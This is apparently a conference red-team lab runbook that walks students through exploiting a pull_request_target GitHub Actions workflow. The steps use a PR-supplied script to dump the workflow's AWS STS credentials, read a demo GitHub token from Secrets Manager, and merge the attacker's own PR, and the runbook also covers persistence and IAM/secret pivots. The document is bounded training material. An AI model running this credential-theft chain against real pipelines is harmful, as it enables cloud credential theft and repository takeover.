# Attendee Runbook: Trust the Pipeline, Lose the Kingdom

This is the live Red Team Village lab path. In the room, students run the core exploit live:

```text
PR-controlled step → STS exports → demo secret → merge
```

The advanced cloud-native chain is taught with slides, logs, diagrams, and code artifacts during the hour. The public Terraform/code bundle is the take-home reproduction path for running the full chain later in a dedicated, empty AWS account you control.

## Safety contract

Everything in this lab is intentionally vulnerable and intentionally bounded.

- Use only the demo repository, demo AWS account, and handles assigned for this session.
- Do not use personal/work tokens, employer accounts, or real secrets.
- The live room path stops after the trophy-wall merge unless the room scope explicitly changes.
- Advanced Lambda/EventBridge, IAM graph, and pivot-secret material is shown through artifacts/code in the live hour.
- If your laptop or Wi-Fi fights you, pair with a neighbor and stay with the trust graph. The public bundle lets you rerun later.


## Prereqs

You need:

- GitHub account.
- Browser signed into GitHub.
- Terminal with `aws`, `jq`, and `curl` if possible.
- Assigned room handle, for example `student07`.

Steps 3 and 3.5 use `YOUR_HANDLE` as a placeholder. Replace it in the filenames and JSON content with the same assigned handle; duplicate handles are rejected.

## Live hands-on: PR to merge authority

Use these steps in order. Each command block is safe to copy after you replace the named values with the room values.

### Step 1 — Fork the Totally Not Vulnerable Repo

Goal: create your own fork so your PR is attacker-controlled input.

In your browser:

1. Open the public demo repo URL shown on the room slide.
2. Confirm the repo README starts with **Totally Not Vulnerable Repo**.
3. Click **Fork**.
4. Keep the fork page open.

Expected result: you have a fork under your GitHub account.

If stuck: pair with a neighbor or ask for the room fixture path. Do not use a work/employer GitHub account.

Why it matters: the lab starts with a normal external pull request against a very normal, totally-not-suspicious repo.

### Step 2 — Review the pipeline configs

Goal: see the trust boundary before exploiting it.

In your browser:

1. Open the upstream demo repo.
2. Open `.github/workflows/ci.yml`.
3. Find the workflow sections named **Checkout PR code** and **Exchange OIDC for STS and run PR-controlled step**.

Expected result: you can see the trusted workflow checks out PR code and later runs a handle-scoped script.

If stuck: make sure you are viewing the upstream room demo repo, not only your fork.

Why it matters: the vulnerable workflow lives in the trusted source repo, but it chooses to run a script from your PR.

### Step 2.5 — Spot the vulnerable lines

Look for these lines in `.github/workflows/ci.yml`:

```yaml
on:
  pull_request_target:
```

```yaml
repository: ${{ github.event.pull_request.head.repo.full_name }}
ref: ${{ github.event.pull_request.head.sha }}
```

```bash
STUDENT_STEP="ci/student-steps/${RTV_HANDLE}.sh"
bash "$STUDENT_STEP"
```

Why it matters: the trusted workflow runs in target-repo context, checks out PR-controlled code, then executes the PR-controlled script.

### Step 3 — Add your trophy-wall submission JSON

Goal: add one harmless content file from your fork using GitHub web.

In your fork:

1. Click **Add file**.
2. Click **Create new file**.
3. Use this filename after replacing `YOUR_HANDLE`:

```text
submissions/YOUR_HANDLE.json
```

Copy this as the file content, then replace `YOUR_HANDLE` and `your message`:

```json
{"handle":"YOUR_HANDLE","message":"your message"}
```

Example for handle `student07`:

```json
{"handle":"student07","message":"I controlled the pipeline."}
```

Commit the file to your fork.

If stuck: the JSON must contain only `handle` and `message`. The filename handle and JSON `handle` must match exactly.

Why it matters: this file is safe content; the next file is the PR-controlled pipeline step the trusted workflow will execute.

### Step 3.5 — Add your PR-controlled pipeline step

Goal: add one handle-scoped script that turns the workflow's AWS session into copy-ready exports.

In your fork:

1. Click **Add file**.
2. Click **Create new file**.
3. Use this filename after replacing `YOUR_HANDLE` with the same handle:

```text
ci/student-steps/YOUR_HANDLE.sh
```

Copy this as the file content:

```bash
#!/usr/bin/env bash
set -euo pipefail

: "${AWS_ACCESS_KEY_ID:?AWS_ACCESS_KEY_ID is required}"
: "${AWS_SECRET_ACCESS_KEY:?AWS_SECRET_ACCESS_KEY is required}"
: "${AWS_SESSION_TOKEN:?AWS_SESSION_TOKEN is required}"
: "${AWS_REGION:?AWS_REGION is required}"

STS_CREDS_PATH="${STS_CREDS_PATH:-/tmp/sts-creds.sh}"
umask 077
mkdir -p "$(dirname "$STS_CREDS_PATH")"

{
  printf 'export AWS_ACCESS_KEY_ID=%s\n' "$AWS_ACCESS_KEY_ID"
  printf 'export AWS_SECRET_ACCESS_KEY=%s\n' "$AWS_SECRET_ACCESS_KEY"
  printf 'export AWS_SESSION_TOKEN=%s\n' "$AWS_SESSION_TOKEN"
  printf 'export AWS_REGION=%s\n' "$AWS_REGION"
} | tee "$STS_CREDS_PATH"
```

Commit the file to your fork.

Expected result: your fork now has two matching files:

```text
submissions/student07.json
ci/student-steps/student07.sh
```

If stuck: the script filename must match the JSON handle exactly. `submissions/student07.json` pairs with `ci/student-steps/student07.sh`.

Why it matters: PR workflow YAML edits do not run under `pull_request_target`. The bug is trusted target workflow context executing PR-controlled code.

### Step 4 — Open a PR back to the demo repo

Goal: trigger the target repo's vulnerable workflow from your forked JSON and pipeline step.

In your browser:

1. Open a pull request from your fork.
2. Target the room demo repo and its default branch.
3. Confirm the PR contains only your two files.
4. Submit the PR.

Expected result: a GitHub Actions run starts for your PR.

If stuck: confirm the PR targets the room demo repo, not your fork's default branch.

Why it matters: the vulnerable `pull_request_target` workflow runs in the target repository context.

### Step 5 — Download temporary AWS credentials from the artifact

Goal: use the STS session written by the script you supplied in the PR.

In your browser:

1. Open your PR.
2. Open the **Actions** run for that PR.
3. Wait for the workflow to finish.
4. Scroll to **Artifacts**.
5. Download **sts-credentials**.
6. Unzip the download.
7. Open `sts-creds.sh`.
8. Paste the four `export` lines into your terminal.

The artifact file should contain four export lines. Do not copy this redacted example; copy the real four export lines from `sts-creds.sh`:

```bash
export AWS_ACCESS_KEY_ID=REDACTED_AWS_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=REDACTED_AWS_SECRET_ACCESS_KEY
export AWS_SESSION_TOKEN=REDACTED_AWS_SESSION_TOKEN
export AWS_REGION=us-east-1
```

After you paste the real four export lines, run:

```bash
printf 'aws env ready: %s %s\n' "$AWS_REGION" "${AWS_ACCESS_KEY_ID:+AWS_ACCESS_KEY_ID_SET}"
```

Expected result:

```text
aws env ready: us-east-1 AWS_ACCESS_KEY_ID_SET
```

If stuck: do not copy from the workflow log; line wrapping can mangle the session token. Download the `sts-credentials` artifact again and copy from `sts-creds.sh`.

Why it matters: temporary means expiring, not unstealable. Your PR-controlled step became the exfil channel.

### Step 6 — Verify the temporary AWS identity

Goal: prove the workflow credentials work outside the workflow.

Run:

```bash
aws sts get-caller-identity
```

Expected result:

```json
{
  "UserId": "REDACTED_DEMO_ROLE_SESSION",
  "Account": "REDACTED_DEMO_ACCOUNT_ID",
  "Arn": "REDACTED_DEMO_ASSUMED_ROLE_ARN"
}
```

If stuck: check that all four export lines from Step 5 are in the same terminal session.

Why it matters: the trust boundary crossed from GitHub Actions into AWS STS.

### Step 7 — Read the demo GitHub token from Secrets Manager

Goal: use the narrow AWS role to retrieve the code-hosting token stored as a demo secret.

Run:

```bash
export PAT="$(aws secretsmanager get-secret-value \
  --secret-id demo/github-pat \
  --query SecretString \
  --output text)"
test -n "${PAT}" && echo "PAT is set"
```

Expected result:

```text
PAT is set
```

If stuck: run Step 6 again. If STS identity works but this command fails, ask for fallback proof from the room staff.

Why it matters: the AWS role is narrow. The secret is not.

### Step 8 — Merge your own PR with the recovered token

Goal: prove the secret read becomes code-hosting authority.

Run after replacing `PR_NUMBER` with your PR number:

```bash
export DEMO_ORG="pipeline-demo-lab"
export DEMO_REPO="cicd-demo"
export PR_NUMBER="replace_with_your_pr_number"

curl -sS -X PUT \
  -H "Authorization: token ${PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${DEMO_ORG}/${DEMO_REPO}/pulls/${PR_NUMBER}/merge" | jq .
```

Expected result:

```json
{
  "sha": "REDACTED_MERGE_SHA",
  "merged": true,
  "message": "Pull Request successfully merged"
}
```

If stuck: your PR URL ends with `/pull/NUMBER`; use that number. Confirm `PAT`, `DEMO_ORG`, `DEMO_REPO`, and `PR_NUMBER` are set in the same terminal session.

Why it matters: you merged it with a credential that did not exist when you opened the PR.

### Step 9 — Refresh the trophy wall

Goal: see the visible impact of the merge.

In your browser:

1. Refresh your PR and confirm it is merged.
2. Open the trophy wall URL shown on the room slide.
3. Refresh after GitHub Pages deploys.

Expected result:

```text
@student07
{
  "handle": "student07",
  "message": "I controlled the pipeline."
}
```

If stuck: the Pages deploy may lag. Watch the room screen or use the fixture trophy-wall screenshot.

Why it matters: the live room path ends at code-hosting impact. The rest of the chain is taught through artifacts/code.

At this point, pause live commands and follow the advanced chain artifact walkthrough.

## Advanced chain: taught with artifacts/code

The same trust mistake can continue beyond the live room path. During the session, the advanced chain is shown through code snippets, pre-captured logs, and diagrams.

### Controlled serverless persistence

Artifact/code path:

```bash
./lab/20-deploy-persistence.sh YOUR_HANDLE
```

What the artifact demonstrates:

- handle/session-prefixed Lambda resources;
- a short-lived EventBridge/Scheduler trigger;
- proof output from logs;
- cleanup by session/handle.

Teaching point:

```text
No implant. No endpoint. No C2. Still durable cloud control-plane behavior.
```

### IAM graph walk

Artifact/code path:

```bash
./lab/30-assume-demo-role.sh YOUR_HANDLE
```

What the artifact demonstrates:

- exactly one intended demo role edge;
- denied output for paths outside the lab graph;
- IAM trust policies as graph edges, not isolated policy blobs.

Teaching point:

```text
Trust policies are graph edges. Attackers walk graphs.
```

### Controlled secrets pivot

Artifact/code path:

```bash
./lab/40-read-demo-pivot-secrets.sh YOUR_HANDLE
```

Demo categories:

- `demo/pivot/code-hosting-admin-token`
- `demo/pivot/ci-platform-admin-key`
- `demo/pivot/data-warehouse-creds`
- `demo/pivot/saas-api-key`

These must be fake/demo values only.

Teaching point:

```text
AWS is not the destination. The secret store is the bridge to everything around AWS.
```


## Take-home Terraform/code

Do this **after the session**, not during the live room lab. Use a dedicated, empty AWS account you control.

Public bundle:

```text
https://github.com/x90skysn3k/rtv-cicd-attack-chain
```

### Take-home Step 1 — Clone the bundle

Goal: get the attendee-safe reproduction files.

Run:

```bash
git clone https://github.com/x90skysn3k/rtv-cicd-attack-chain.git
cd rtv-cicd-attack-chain
```

Expected result: you are inside the public bundle repository.

### Take-home Step 2 — Configure Terraform inputs

Goal: point Terraform at your empty AWS account and throwaway GitHub repo.

Run:

```bash
cd terraform/demo-account
cp terraform.tfvars.example terraform.tfvars
```

Edit `terraform.tfvars` and set:

```hcl
aws_account_id = "replace_with_your_empty_aws_account_id"
github_org     = "replace_with_your_throwaway_github_org"
github_repo    = "cicd-demo"
aws_region     = "us-east-1"
```

Expected result: `terraform.tfvars` exists locally and is not committed.

### Take-home Step 3 — Create the bounded AWS lab resources

Goal: create only the OIDC role and demo secret needed for the reproduction.

Run:

```bash
terraform init
terraform validate
terraform plan
terraform apply
```

Expected result: Terraform prints `role_arn`, `secret_name`, and `oidc_provider_arn`.

If stuck: confirm your active AWS credentials point at the same account as `aws_account_id`.

### Take-home Step 4 — Store a throwaway GitHub token

Goal: put a demo-scoped token into the lab secret.

Run:

```bash
aws secretsmanager put-secret-value \
  --secret-id demo/github-pat \
  --secret-string "replace_with_throwaway_demo_token"
```

Expected result: AWS accepts a new secret version.

If stuck: do not use a personal/work token. Create a throwaway token for the throwaway repo only.

### Take-home Step 5 — Walk the same student path

Goal: reproduce the live chain against your own empty account and throwaway repo.

Use the same live steps above:

```text
fork → submission JSON → PR → workflow log exports → STS identity → demo PAT read → merge → trophy wall
```

Expected result: the same trust-boundary failure is visible without using the conference AWS account.

The live session avoids Terraform so the hour stays focused on the attack graph, not provider downloads and state management.

## Find yourself in the logs

After the live and take-home command paths, look for:

- GitHub PR/workflow events;
- `AssumeRoleWithWebIdentity`;
- `GetSecretValue` for the demo PAT;
- Lambda/EventBridge/Scheduler creation from the artifact walkthrough;
- `AssumeRole` graph movement from the artifact walkthrough;
- demo pivot-secret reads from the artifact walkthrough.

Teaching point:

```text
You generated the first pivot live. Now learn how to find the rest of the chain.
```
